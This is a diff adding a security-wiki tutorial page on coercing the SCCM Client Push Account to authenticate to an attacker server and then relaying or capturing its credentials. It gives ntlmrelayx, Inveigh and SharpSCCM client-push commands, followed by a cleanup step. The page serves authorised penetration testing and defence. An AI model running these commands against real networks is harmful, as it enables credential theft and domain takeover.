@@ -1,0 +1,90 @@
+---
+title: "Client Push Authentication Coercion"
+description: "Coercing the Client Push Account to authenticate, then relaying or capturing it"
+---
+
+## Theory
+
+Where SCCM deploys clients via **Client Push Installation**, the "Client Push Account" authenticates to every machine it installs on. That account usually holds local administrator rights across many assets, so coercing it and relaying or capturing the authentication escalates directly.
+
+## Practice
+
+<Callout type="info">
+
+In some case, the "Client Push Accounts" could even be part of the Domain Admins group, leading to a complete takeover of the domain.
+
+</Callout>
+
+The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.
+
+<Tabs items={['Coerce', 'Wait']}>
+<Tab value="Coerce">
+
+**Option 1: Forcefully "coerce" the Client Push Installation**
+
+<Callout type="error">
+
+Important note: You want to read [this blog](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) post before you continue this route, as this attack might leave traces behind and might junk up the SCCM environment.
+
+</Callout>
+
+**Step 1: Prepare coercion receiver**
+
+Note that you could either capture & crack received credentials or relay them to a suitable target system (or both).
+
+```sh
+# On Linux
+### Relay using ntlmrelayx.py
+ntlmrelayx.py -smb2support -socks -ts -ip 10.250.2.100 -t 10.250.2.179
+```
+```powershell
+# On Windows
+### Credential capture using Inveigh 
+Inveigh.exe
+```
+
+**Step 2: Trigger Client-Push Installation**
+
+```powershell
+# If admin access over Management Point (MP)
+SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
+
+# If not MP admin
+SharpSCCM.exe invoke client-push -t <AttackerServer>
+```
+
+**Step 3: Cleanup**
+
+If you run the above SharpSCCM command with the `--as-admin` parameter (cause you have admin privileges over the MP), there's nothing to do. Otherwise get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t <AttackerServer>` parameter. This is the device name that will appear in SCCM.
+
+</Tab>
+
+<Tab value="Wait">
+
+**Option 2: Wait for Client Push Installation**
+
+```powershell
+# Credential capture using Inveigh 
+Inveigh.exe
+```
+
+</Tab>
+</Tabs>
+
+## Resources
+
+<ResourceCard href="https://www.securesystems.de/blog/active-directory-spotlight-attacking-the-microsoft-configuration-manager/" title="www.securesystems.de" description="www.securesystems.de" />
+
+<ResourceCard href="https://www.hub.trimarcsecurity.com/post/push-comes-to-shove-exploring-the-attack-surface-of-sccm-client-push-accounts" title="Push Comes To Shove: exploring the attack surface of SCCM Client Push Accounts" description="www.hub.trimarcsecurity.com" icon="/assets/favicons/www.hub.trimarcsecurity.com.png" />
+
+<ResourceCard href="https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9" title="posts.specterops.io" description="posts.specterops.io" />
+
+<ResourceCard href="https://blog.xpnsec.com/unobfuscating-network-access-accounts/" title="Exploring SCCM by Unobfuscating Network Access Accounts" description="blog.xpnsec.com" icon="/assets/favicons/blog.xpnsec.com.png" />
+
+<ResourceCard href="https://posts.specterops.io/sccm-site-takeover-via-automatic-client-push-installation-f567ec80d5b1" title="posts.specterops.io" description="posts.specterops.io" />
+
+<ResourceCard href="https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a" title="posts.specterops.io" description="posts.specterops.io" />
+
+<ResourceCard href="https://posts.specterops.io/site-takeover-via-sccms-adminservice-api-d932e22b2bf" title="posts.specterops.io" description="posts.specterops.io" />
+
+<ResourceCard href="https://posts.specterops.io/sccm-hierarchy-takeover-with-high-availability-7dcbd3696b43" title="posts.specterops.io" description="posts.specterops.io" />
